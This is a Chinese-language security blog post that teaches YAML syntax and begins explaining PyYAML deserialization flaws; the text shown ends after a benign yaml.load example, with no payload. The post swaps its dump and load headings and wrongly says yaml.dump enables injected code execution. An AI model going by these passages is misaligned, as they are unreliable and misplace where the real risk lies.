<!DOCTYPE HTML>
<html lang="zh-CN">


<head>
    <meta charset="utf-8">
    <meta name="keywords" content="PyYmal反序列化, hybcx&#39;s blog">
    <meta name="description" content="0x01 YMAL简介
YAML是一种轻量级的数据序列化语言，它的名称是&#34;YAML Ain’t Markup Language&#34;的递归缩写。它的设计目标是成为一种人类可读的数据交换格式。
YAML的语法非常简洁，使用缩进和特定的符号来表示数">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="renderer" content="webkit|ie-stand|ie-comp">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="format-detection" content="telephone=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <meta name="referrer" content="no-referrer-when-downgrade">
    <!-- Global site tag (gtag.js) - Google Analytics -->


    <title>PyYmal反序列化 | hybcx&#39;s blog</title>
    <link rel="icon" type="image/png" href="/favicon.png">
    


    <!-- bg-cover style     -->



<link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
<link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
<link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
<link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
<link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
<link rel="stylesheet" type="text/css" href="/css/matery.css">
<link rel="stylesheet" type="text/css" href="/css/my.css">
<link rel="stylesheet" type="text/css" href="/css/dark.css" media="none" onload="if(media!='all')media='all'">




    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
    <link rel="stylesheet" href="/css/post.css">




    
        <link rel="stylesheet" type="text/css" href="/css/reward.css">
    



    <script src="/libs/jquery/jquery-3.6.0.min.js"></script>

<meta name="generator" content="Hexo 7.2.0">
<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
</head>


<body>
    <header class="navbar-fixed">
    <nav id="headNav" class="bg-color nav-transparent">
        <div id="navContainer" class="nav-wrapper container">
            <div class="brand-logo">
                <a href="/" class="waves-effect waves-light">
                    
                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
                    
                    <span class="logo-span diyFont">hybcx&#39;s blog</span>
                </a>
            </div>
            

<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
<ul class="right nav-menu">
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/" class="waves-effect waves-light">
      
      <i class="fas fa-home" style="zoom: 0.6;"></i>
      
      <span>首页</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/tags" class="waves-effect waves-light">
      
      <i class="fas fa-tags" style="zoom: 0.6;"></i>
      
      <span>标签</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/categories" class="waves-effect waves-light">
      
      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
      
      <span>分类</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/archives" class="waves-effect waves-light">
      
      <i class="fas fa-archive" style="zoom: 0.6;"></i>
      
      <span>归档</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/about" class="waves-effect waves-light">
      
      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
      
      <span>关于</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/contact" class="waves-effect waves-light">
      
      <i class="fas fa-comments" style="zoom: 0.6;"></i>
      
      <span>留言板</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/friends" class="waves-effect waves-light">
      
      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
      
      <span>友情链接</span>
    </a>
    
  </li>
  
  <li>
    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
    </a>
  </li>
  <li>
    <a href="javascript:;" class="waves-effect waves-light" onclick="switchNightMode()" title="深色/浅色模式" >
      <i id="sum-moon-icon" class="fas fa-sun" style="zoom: 0.85;"></i>
    </a>
  </li>
</ul>


<div id="mobile-nav" class="side-nav sidenav">

    <div class="mobile-head bg-color">
        
        <img src="/medias/logo.png" class="logo-img circle responsive-img">
        
        <div class="logo-name">hybcx&#39;s blog</div>
        <div class="logo-desc">
            
            Never really desperate, only the lost of the soul.
            
        </div>
    </div>

    <ul class="menu-list mobile-menu-list">
        
        <li class="m-nav-item">
	  
		<a href="/" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-home"></i>
			
			首页
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/tags" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-tags"></i>
			
			标签
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/categories" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-bookmark"></i>
			
			分类
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/archives" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-archive"></i>
			
			归档
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/about" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-user-circle"></i>
			
			关于
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/contact" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-comments"></i>
			
			留言板
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/friends" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-address-book"></i>
			
			友情链接
		</a>
          
        </li>
        
        
        <li><div class="divider"></div></li>
        <li>
            <a href="https://github.com/blinkfox/hexo-theme-matery" class="waves-effect waves-light" target="_blank">
                <i class="fab fa-github-square fa-fw"></i>Fork Me
            </a>
        </li>
        
    </ul>
</div>


        </div>

        
            <style>
    .nav-transparent .github-corner {
        display: none !important;
    }

    .github-corner {
        position: absolute;
        z-index: 10;
        top: 0;
        right: 0;
        border: 0;
        transform: scale(1.1);
    }

    .github-corner svg {
        color: #0f9d58;
        fill: #fff;
        height: 64px;
        width: 64px;
    }

    .github-corner:hover .octo-arm {
        animation: a 0.56s ease-in-out;
    }

    .github-corner .octo-arm {
        animation: none;
    }

    @keyframes a {
        0%,
        to {
            transform: rotate(0);
        }
        20%,
        60% {
            transform: rotate(-25deg);
        }
        40%,
        80% {
            transform: rotate(10deg);
        }
    }
</style>

<a href="https://github.com/blinkfox/hexo-theme-matery" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
   data-tooltip="Fork Me" data-position="left" data-delay="50">
    <svg viewBox="0 0 250 250" aria-hidden="true">
        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
              fill="currentColor" class="octo-body"></path>
    </svg>
</a>
        
    </nav>

</header>

    



<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/23.jpg')">
    <div class="container" style="right: 0px;left: 0px;">
        <div class="row">
            <div class="col s12 m12 l12">
                <div class="brand">
                    <h1 class="description center-align post-title">PyYmal反序列化</h1>
                </div>
            </div>
        </div>
    </div>
</div>




<main class="post-container content">

    
    <div class="row">
    <div id="main-content" class="col s12 m12 l9">
        <!-- 文章内容详情 -->
<div id="artDetail">
    <div class="card">
        <div class="card-content article-info">
            <div class="row tag-cate">
                <div class="col s7">
                    
                    <div class="article-tag">
                        
                            <a href="/tags/%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/">
                                <span class="chip bg-color">基本知识</span>
                            </a>
                        
                    </div>
                    
                </div>
                <div class="col s5 right-align">
                    
                    <div class="post-cate">
                        <i class="fas fa-bookmark fa-fw icon-category"></i>
                        
                            <a href="/categories/web%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/" class="post-category">
                                web知识总结
                            </a>
                        
                    </div>
                    
                </div>
            </div>

            <div class="post-info">
                
                <div class="post-date info-break-policy">
                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
                    2024-03-23
                </div>
                

                
                <div class="post-date info-break-policy">
                    <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
                    2024-03-23
                </div>
                

                
                <div class="info-break-policy">
                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
                    9k
                </div>
                

                
                <div class="info-break-policy">
                    <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
                    37 分
                </div>
                

                
                    <div id="busuanzi_container_page_pv" class="info-break-policy">
                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
                        <span id="busuanzi_value_page_pv"></span>
                    </div>
				
            </div>
        </div>
        <hr class="clearfix">

        
        <!-- 是否加载使用自带的 prismjs. -->
        <link rel="stylesheet" href="/libs/prism/prism.css">
        

        

        <div class="card-content article-card-content">
            <div id="articleContent">
                <h1>0x01 YMAL简介</h1>
<p>YAML是一种轻量级的数据序列化语言，它的名称是"YAML Ain’t Markup Language"的递归缩写。它的设计目标是成为一种人类可读的数据交换格式。</p>
<p>YAML的语法非常简洁，使用缩进和特定的符号来表示数据结构。它支持多种数据类型，包括标量（字符串、数字、布尔值等）、序列（数组、列表等）和映射（键值对）。YAML还支持注释和引用，可以使文档更易于理解和维护。（其文件一般以.yml为后缀）</p>
<h1>0x02 Yaml基本语法</h1>
<p>这里也就是纯cv了。</p>
<ul>
<li>
<p><strong>大小写敏感</strong></p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss"><span class="token property">aaa</span><span class="token punctuation">:</span>1
<span class="token property">AAA</span><span class="token punctuation">:</span>2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>这两个对于Yaml来说是不同的变量</p>
</li>
<li>
<p><strong>使用缩进表示层级关系缩进不允许使用tab，只允许空格</strong></p>
</li>
<li>
<p><strong>缩进的空格数不重要，只要相同层级的元素左对齐即可</strong></p>
<p>举个例子，</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss"># This is a YAML document <span class="token module-modifier keyword">with</span> nested structures
<span class="token property">person</span><span class="token punctuation">:</span>
  <span class="token property">name</span><span class="token punctuation">:</span> John
  <span class="token property">age</span><span class="token punctuation">:</span> 30
  <span class="token property">address</span><span class="token punctuation">:</span>
    <span class="token property">street</span><span class="token punctuation">:</span> Main St.
    <span class="token property">city</span><span class="token punctuation">:</span> Anytown
    <span class="token property">state</span><span class="token punctuation">:</span> CA
  <span class="token property">hobbies</span><span class="token punctuation">:</span>
    <span class="token operator">-</span> reading
    <span class="token operator">-</span> hiking
    <span class="token operator">-</span> swimming<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>在这个示例中，<code>person</code>是一个映射类型，包含四个键值对。其中<code>address</code>和<code>hobbies</code>都是映射类型和序列类型的嵌套结构，使用缩进表示层级关系。<code>address</code>包含三个键值对，<code>hobbies</code>包含一个序列，其中包含三个元素。</p>
</li>
<li>
<p><strong>'#'表示注释</strong></p>
<p>但是只能支持单行注释</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">#注释1
#注释2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
</li>
<li>
<p><strong>一个文件中可以包含多个文件的内容，用“ — ”即三个破折号表示一份内容的开始，用“ … ”即三个小数点表示一份内容的结束（非必需）</strong></p>
</li>
</ul>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">---
<span class="token property">example1</span><span class="token punctuation">:</span>
  <span class="token property">username</span><span class="token punctuation">:</span> admin
  <span class="token property">passwd</span><span class="token punctuation">:</span> 123456
...

---
<span class="token property">example2</span><span class="token punctuation">:</span>
  <span class="token property">username</span><span class="token punctuation">:</span> aaa
  <span class="token property">passwd</span><span class="token punctuation">:</span> 666
...<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h1>0x03 Yaml数据类型与结构</h1>
<ul>
<li>
<p><strong>标量（Scalar）</strong>：标量是YAML中的基本数据类型，包括字符串、整数、浮点数、布尔值等。例如：</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss"><span class="token property">name</span><span class="token punctuation">:</span> <span class="token string">"John"</span>  # 字符串
<span class="token property">age</span><span class="token punctuation">:</span> 30       # 整数 （可以支持二进制表示）
<span class="token property">height</span><span class="token punctuation">:</span> 5.8   # 浮点数 （可以支持科学计数法）
<span class="token property">is_student</span><span class="token punctuation">:</span> <span class="token boolean">false</span>  # 布尔值 <span class="token punctuation">(</span><span class="token null keyword">null</span><span class="token punctuation">,</span>Null<span class="token punctuation">,</span>~均为空<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
</li>
<li>
<p><strong>列表（List）</strong>：列表用短横线（-）表示，可以包含多个标量值，形成一个有序的序列。例如：</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss"><span class="token property">fruits</span><span class="token punctuation">:</span>
  <span class="token operator">-</span> apple
  <span class="token operator">-</span> banana
  <span class="token operator">-</span> orange<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>支持<strong>内敛格式</strong>（用方括号包裹，用逗号+空格分隔），例如：</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss"><span class="token property">fruit</span><span class="token punctuation">:</span> [apple<span class="token punctuation">,</span> banana<span class="token punctuation">,</span> orange]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>支持多维数组（<strong>用缩进表示层级关系</strong>），例如：</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss"><span class="token property">fruit</span><span class="token punctuation">:</span> 
<span class="token operator">-</span>
  <span class="token operator">-</span> apple
  <span class="token operator">-</span> banana
<span class="token operator">-</span>
  <span class="token operator">-</span> orange<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
<li>
<p><strong>映射（Mapping）</strong>：映射用键值对表示，使用冒号（:）分隔键和值，可以包含多个键值对，形成一个无序的键值对集合。例如：</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss"><span class="token property">person</span><span class="token punctuation">:</span>
  <span class="token property">name</span><span class="token punctuation">:</span> John
  <span class="token property">age</span><span class="token punctuation">:</span> 30
  <span class="token property">city</span><span class="token punctuation">:</span> New York<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>支持<strong>流式风格</strong>的语法(用花括号包裹，用逗号+空格分割)，例如：</p>
</li>
</ul>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss"><span class="token selector">key: </span><span class="token punctuation">{</span> <span class="token property">username</span><span class="token punctuation">:</span> admin<span class="token punctuation">,</span> <span class="token property">passwd</span><span class="token punctuation">:</span> 123456<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>可以使用“?”声明一个复杂对象，从而可以使用多个数组来组成键，例如：</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">?
  <span class="token operator">-</span> user1
  <span class="token operator">-</span> <span class="token property">user2</span>
<span class="token punctuation">:</span>
  <span class="token operator">-</span> passwd1
  <span class="token operator">-</span> passwd2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>允许多层嵌套(<strong>用缩进表示层级关系</strong>)，例如：</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss"><span class="token property">example</span><span class="token punctuation">:</span>
  <span class="token property">aaa</span><span class="token punctuation">:</span> 123
  <span class="token property">bbb</span><span class="token punctuation">:</span>
    <span class="token property">ccc</span><span class="token punctuation">:</span>
      <span class="token property">ddd</span><span class="token punctuation">:</span> 666<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>在这个示例中，<code>example</code>是一个映射类型，包含一个键值对<code>aaa</code>和一个键值对<code>bbb</code>。<code>bbb</code>的值是一个映射类型，包含一个键值对<code>ccc</code>，而<code>ccc</code>的值又是一个映射类型，包含一个键值对<code>ddd</code>。<code>ddd</code>的值为<code>666</code>。</p>
<ul>
<li>
<p><strong>多行字符串（Multi-line String）</strong>：YAML支持在标量值中使用多行字符串，可以使用管道符（|）或折叠式大于号（&gt;）来表示。例如：</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss"><span class="token property">description</span><span class="token punctuation">:</span> |
  This is a multi-line
  string using the pipe symbol. # 每行的缩进和行尾空白都会被去掉，而额外的缩进会被保留
<span class="token property">lines</span><span class="token punctuation">:</span> <span class="token operator">&gt;</span>
  aaa
  bbbbbb
  ccccccc

  dddddddd  # 只有空白行才会被识别为换行，原来的换行符都会被转换成空格<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>字符串一般不用引号包裹，但是如果字符串中使用了<strong>反斜杠“\”开头的转义字符就必须用引号包裹</strong>，例如</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss"><span class="token property">strings</span><span class="token punctuation">:</span> 
  <span class="token operator">-</span> Hi
  <span class="token operator">-</span> <span class="token string">"\u0048\u0069"</span> # Hi的Unicode编码
  <span class="token operator">-</span> <span class="token string">"\x46\x69\x6e\x65"</span> # Fine的Hex编码<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p><strong>引用（Reference）</strong>：YAML支持使用锚点（&amp;）和别名（*）来创建引用，可以在不同位置引用相同的值。例如：</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss"><span class="token property">person1</span><span class="token punctuation">:</span> &amp;person_alias
  <span class="token property">name</span><span class="token punctuation">:</span> John
  <span class="token property">age</span><span class="token punctuation">:</span> 30

<span class="token property">person2</span><span class="token punctuation">:</span> *person_alias<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>相当于</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss"><span class="token property">person1</span><span class="token punctuation">:</span>
  <span class="token property">name</span><span class="token punctuation">:</span> John
  <span class="token property">age</span><span class="token punctuation">:</span> 30

<span class="token property">person2</span><span class="token punctuation">:</span>
  <span class="token property">name</span><span class="token punctuation">:</span> John
  <span class="token property">age</span><span class="token punctuation">:</span> 30<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>可以利用**锚点（&amp;）和别名（*）<strong>以及</strong>合并标签"&lt;&lt;"**将我们的yaml变得更加整洁，例如：</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss"># 使用锚点和别名消除重复代码
<span class="token property">defaults</span><span class="token punctuation">:</span> &amp;defaults
  <span class="token property">host</span><span class="token punctuation">:</span> localhost
  <span class="token property">port</span><span class="token punctuation">:</span> 8080
  <span class="token property">timeout</span><span class="token punctuation">:</span> 30

<span class="token property">development</span><span class="token punctuation">:</span>
  &lt;&lt;<span class="token punctuation">:</span> *defaults
  <span class="token property">database</span><span class="token punctuation">:</span> dev_db

<span class="token property">test</span><span class="token punctuation">:</span>
  &lt;&lt;<span class="token punctuation">:</span> *defaults
  <span class="token property">database</span><span class="token punctuation">:</span> test_db
  <span class="token property">timeout</span><span class="token punctuation">:</span> 60

<span class="token property">production</span><span class="token punctuation">:</span>
  &lt;&lt;<span class="token punctuation">:</span> *defaults
  <span class="token property">host</span><span class="token punctuation">:</span> prod_host
  <span class="token property">port</span><span class="token punctuation">:</span> 80<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>相当于</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss"><span class="token property">development</span><span class="token punctuation">:</span>
  <span class="token property">host</span><span class="token punctuation">:</span> localhost
  <span class="token property">port</span><span class="token punctuation">:</span> 8080
  <span class="token property">timeout</span><span class="token punctuation">:</span> 30
  <span class="token property">database</span><span class="token punctuation">:</span> dev_db

<span class="token property">test</span><span class="token punctuation">:</span>
  <span class="token property">host</span><span class="token punctuation">:</span> localhost
  <span class="token property">port</span><span class="token punctuation">:</span> 8080
  <span class="token property">timeout</span><span class="token punctuation">:</span> 60
  <span class="token property">database</span><span class="token punctuation">:</span> test_db

<span class="token property">production</span><span class="token punctuation">:</span>
  <span class="token property">host</span><span class="token punctuation">:</span> prod_host
  <span class="token property">port</span><span class="token punctuation">:</span> 80
  <span class="token property">timeout</span><span class="token punctuation">:</span> 30<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
<li>
<p><strong>时间戳（Timestamp）</strong>：在YAML中，可以使用ISO 8601格式的时间戳来表示日期和时间。ISO 8601是一种国际标准，用于表示日期、时间和日期时间的格式，例如：</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss"><span class="token property">timestamp</span><span class="token punctuation">:</span> <span class="token property">2023-04-24T12</span><span class="token punctuation">:</span><span class="token property">34</span><span class="token punctuation">:</span>56.789Z<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
</ul>
<p><strong>类型转换</strong></p>
<p>Yaml支持使用**严格类型标签"!!"（双感叹号+目标类型）**来强制转换类型，例如：</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss"># 使用显式类型转换将字符串转换成整数和浮点数
<span class="token property">age</span><span class="token punctuation">:</span> !!int 30
<span class="token property">pi</span><span class="token punctuation">:</span> !!float 3.14

# 使用显式类型转换将数字转换成字符串
<span class="token property">number_as_str</span><span class="token punctuation">:</span> !!str 123

# 使用显式类型转换将字符串转换成布尔值
<span class="token property">is_valid</span><span class="token punctuation">:</span> !!bool <span class="token string">"true"</span>

# 使用显式类型转换将时间戳转换成日期时间
<span class="token property">created_at</span><span class="token punctuation">:</span> !!timestamp <span class="token property">2023-04-24T12</span><span class="token punctuation">:</span><span class="token property">34</span><span class="token punctuation">:</span>56.789Z

# 使用显式类型转换将列表转换成其他类型
<span class="token property">list_as_str</span><span class="token punctuation">:</span> !!str [1<span class="token punctuation">,</span> 2<span class="token punctuation">,</span> 3]
<span class="token property">list_as_map</span><span class="token punctuation">:</span> !!map [1<span class="token punctuation">,</span> 2<span class="token punctuation">,</span> 3]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h1>0x04 反序列化漏洞成因</h1>
<h2 id="PyYaml-5-1">PyYaml&lt;=5.1</h2>
<p>在python中的PyYAML库中提供这几种方式实现python和Yaml这两种语言的转换。</p>
<h3 id="yaml-python">yaml-&gt;python</h3>
<p><strong>yaml.dump</strong></p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">yaml.<span class="token function">dump</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>将Python对象<code>data</code>转换为YAML格式的方法。它将Python对象序列化为YAML格式的字符串，并返回这个字符串。在这个方法中，<code>data</code>是一个Python对象，可以是字典、列表、元组、整数、浮点数、字符串、布尔值等基本数据类型，也可以是自定义的类的实例。</p>
<p>举个例子：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> yaml

data <span class="token operator">=</span> <span class="token punctuation">{</span>
    <span class="token string">'name'</span><span class="token punctuation">:</span> <span class="token string">'John'</span><span class="token punctuation">,</span>
    <span class="token string">'age'</span><span class="token punctuation">:</span> <span class="token number">30</span><span class="token punctuation">,</span>
    <span class="token string">'is_student'</span><span class="token punctuation">:</span> <span class="token boolean">True</span><span class="token punctuation">,</span>
    <span class="token string">'hobbies'</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">'reading'</span><span class="token punctuation">,</span> <span class="token string">'swimming'</span><span class="token punctuation">,</span> <span class="token string">'traveling'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
    <span class="token string">'address'</span><span class="token punctuation">:</span> <span class="token punctuation">{</span>
        <span class="token string">'street'</span><span class="token punctuation">:</span> <span class="token string">'123 Main St'</span><span class="token punctuation">,</span>
        <span class="token string">'city'</span><span class="token punctuation">:</span> <span class="token string">'Anytown'</span><span class="token punctuation">,</span>
        <span class="token string">'state'</span><span class="token punctuation">:</span> <span class="token string">'CA'</span><span class="token punctuation">,</span>
        <span class="token string">'zip'</span><span class="token punctuation">:</span> <span class="token string">'12345'</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

yaml_data <span class="token operator">=</span> yaml<span class="token punctuation">.</span>dump<span class="token punctuation">(</span>data<span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span>yaml_data<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>输出结果：</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss"><span class="token property">address</span><span class="token punctuation">:</span>
  <span class="token property">city</span><span class="token punctuation">:</span> Anytown
  <span class="token property">state</span><span class="token punctuation">:</span> CA
  <span class="token property">street</span><span class="token punctuation">:</span> 123 Main St
  <span class="token property">zip</span><span class="token punctuation">:</span> <span class="token string">'12345'</span>
<span class="token property">age</span><span class="token punctuation">:</span> 30
<span class="token property">hobbies</span><span class="token punctuation">:</span>
<span class="token operator">-</span> reading
<span class="token operator">-</span> swimming
<span class="token operator">-</span> traveling
<span class="token property">is_student</span><span class="token punctuation">:</span> <span class="token boolean">true</span>
<span class="token property">name</span><span class="token punctuation">:</span> John<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>在这段代码中， 我们定义了一个data字典，然后使用yaml.dump方法将data对象序列为yaml格式，并赋值给yaml_data，最后打印出来，得到我们最终的yaml格式数据</p>
<p>其实通俗点来说，就是将python的对象实例转化为yaml格式的字符串，也就是<strong>序列化</strong>。</p>
<p>如果我们的Python对象中包含自定义类的实例、函数等，那么使用<code>yaml.dump</code>方法进行序列化可能会导致安全问题。攻击者可以通过在YAML数据中注入恶意代码来执行任意代码，从而导致应用程序受到攻击。</p>
<h3 id="python-yaml">python-&gt;yaml</h3>
<p><strong>load()</strong></p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss"><span class="token function">load</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><code>load(data)</code>是将YAML格式的字符串转换为Python对象的方法。它将YAML格式的字符串反序列化为Python对象，并返回这个对象。在这个方法中，<code>data</code>是一个包含YAML格式字符串的变量，可以是从文件中读取的字符串，也可以是用户输入的字符串等。</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> yaml

data <span class="token operator">=</span> <span class="token triple-quoted-string string">"""
address:
  city: Anytown
  state: CA
  street: 123 Main St
  zip: '12345'
age: 30
hobbies:
- reading
- swimming
- traveling
is_student: true
name: John
"""</span>

yaml_data <span class="token operator">=</span> yaml<span class="token punctuation">.</span>load<span class="token punctuation">(</span>data<span class="token punctuation">,</span> Loader<span class="token operator">=</span>yaml<span class="token punctuation">.</span>Loader<span class="token punctuation">)</span>
